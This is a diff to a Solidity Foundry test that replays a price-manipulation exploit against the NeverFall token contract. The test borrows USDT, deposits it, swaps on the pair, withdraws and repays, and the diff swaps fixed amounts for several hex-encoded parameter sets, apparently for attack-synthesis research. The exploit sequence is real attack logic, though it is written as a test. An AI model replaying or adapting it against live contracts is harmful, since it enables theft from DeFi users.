@@ -232,21 +232,75 @@ contract NeverFallTestBase is Test, BlockLoader {
         );
     }
 
+    // function test_gt() public {
+    //     vm.startPrank(attacker);
+    //     emit log_named_uint("amt0", 1600000e18);
+    //     borrow_usdt_owner(1600000e18);
+    //     printBalance("After step0 ");
+    //     emit log_named_uint("amt1", 200000 * 1e18);
+    //     deposit_neverFall_usdt_neverFall(200000 * 1e18);
+    //     printBalance("After step1 ");
+    //     emit log_named_uint("amt2", 1300000 * 1e18);
+    //     emit log_named_uint("amt3", 0);
+    //     swap_pair_attacker_usdt_neverFall(1300000 * 1e18, 0);
+    //     printBalance("After step2 ");
+    //     emit log_named_uint("amt4", neverFall.balanceOf(attacker));
+    //     withdraw_neverFall_neverFall_usdt(neverFall.balanceOf(attacker));
+    //     printBalance("After step3 ");
+    //     emit log_named_uint("amt5", 1600000e18);
+    //     payback_usdt_owner(1600000e18);
+    //     printBalance("After step4 ");
+    //     require(attackGoal(), "Attack failed!");
+    //     vm.stopPrank();
+    // }
+
     function test_gt() public {
+// uint256 amt0 = 0x1da43d518ddd810000000;
+// uint256 amt1 = 0x50e26b190965f8000000;
+// uint256 amt2 = 0x189615c1f1dbe70000000;
+// uint256 amt3 = 0x67d3594207ddb000000000;
+// // uint256 amt4 = 0x2deac5d50c6f5c00000000;
+// uint256 amt5 = 0x1dbb011f4130e70000000;
+
+// uint256 amt0 = 0xfc104c4e484838000000;
+// uint256 amt1 = 0x69dbaff512dcb8000000;
+// uint256 amt2 = 0x92349c4d894b20000000;
+// uint256 amt3 = 0x92b6d15aaaf24800000000;
+// uint256 amt4_1 = 0xbbb27f7997838000000000;
+// // uint256 amt5 = 0xfcd1efc38b03d8000000;
+uint256 amt0 = 0x1098e90f1e540d0000000;
+uint256 amt1 = 0x5e189adb8164b4000000;
+uint256 amt2 = 0xab75ecc9b98a40000000;
+uint256 amt3 = 0x92b6d15aaaf24800000000;
+uint256 amt4_1 = 0x9628637f45531000000000;
+uint256 amt5 = 0x10a5a8f0f780650000000;
+// uint256 amt0 = 0xd8a51ca65252c0000000;
+// uint256 amt1 = 0x700bd0b7de3274000000;
+// uint256 amt2 = 0x68994b4edbeb38000000;
+// uint256 amt3 = 0x6cfcbb3d1a335400000000;
+// uint256 amt4_1 = 0xa381374d1975e000000000;
+// uint256 amt5 = 0xd94b7ec8b13d00000000;
         vm.startPrank(attacker);
-        borrow_usdt_owner(1600000e18);
+        vm.assume(amt5 >= amt0);
+        borrow_usdt_owner(amt0);
         printBalance("After step0 ");
-        deposit_neverFall_usdt_neverFall(200000 * 1e18);
+        deposit_neverFall_usdt_neverFall(amt1);
         printBalance("After step1 ");
-        swap_pair_attacker_usdt_neverFall(1300000 * 1e18, 0);
+        emit log_named_decimal_uint("amt2", amt2, 18);
+        emit log_named_decimal_uint("amt3", amt3, 18);
+        
+        emit log_named_decimal_uint("pair.totalSupply()", pair.totalSupply(), 18);
+        swap_pair_attacker_usdt_neverFall(amt2, amt3);
         printBalance("After step2 ");
-        withdraw_neverFall_neverFall_usdt(neverFall.balanceOf(attacker));
+        emit log_named_decimal_uint("amt4", amt4_1, 18);
+        uint256 amt4 = neverFall.balanceOf(attacker) ;
+        withdraw_neverFall_neverFall_usdt(amt4);
         printBalance("After step3 ");
-        payback_usdt_owner(1600000e18);
+        payback_usdt_owner(amt5);
         printBalance("After step4 ");
-        require(attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
+
 
     function check_gt(
         uint256 amt0,
@@ -263,7 +317,7 @@ contract NeverFallTestBase is Test, BlockLoader {
         swap_pair_attacker_usdt_neverFall(amt2, amt3);
         withdraw_neverFall_neverFall_usdt(amt4);
         payback_usdt_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
